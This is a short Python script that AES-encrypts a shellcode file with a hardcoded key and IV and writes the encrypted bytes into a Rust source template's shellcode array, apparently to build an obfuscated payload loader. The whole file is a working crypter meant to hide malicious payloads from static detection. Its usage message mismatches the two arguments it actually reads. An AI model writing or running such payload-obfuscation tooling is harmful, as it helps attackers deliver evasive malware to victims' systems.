import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from binascii import hexlify, unhexlify

def encrypt_shellcode(shellcode: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(shellcode, AES.block_size))

def decrypt_shellcode(encrypted_shellcode: bytes, key: bytes, iv: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted_shellcode), AES.block_size)

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <shellcode_file>")
        sys.exit(1)

    shellcode_file = sys.argv[1]
    source_file = sys.argv[2]

    if not os.path.isfile(shellcode_file):
        print(f"File not found: {shellcode_file}")
        sys.exit(1)

    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()

    key = b'verysecretkey123'  # 16 bytes key for AES-128
    iv = b'initialvector123'   # 16 bytes IV

    encrypted_shellcode = encrypt_shellcode(shellcode, key, iv)
    template = open(source_file, "rt")
    data = template.read()
    data = data.replace('let mut shellcode: &mut [u8] = &mut[ ];', 'let mut shellcode: &mut [u8] = &mut[ 0x' + ', 0x'.join(hex(x)[2:] for x in encrypted_shellcode) + ' ];')
    template.close()
    # Save the modified template
    file_name, file_extension = os.path.splitext(source_file)
    template = open(file_name + '_modified' + file_extension, 'w')
    template.write(data)
    template.close()
    #print(f"Encrypted shellcode: {hexlify(encrypted_shellcode).decode()}")

    #decrypted_shellcode = decrypt_shellcode(encrypted_shellcode, key, iv)
    #print(f"Decrypted shellcode: {hexlify(decrypted_shellcode).decode()}")

if __name__ == "__main__":
    main()
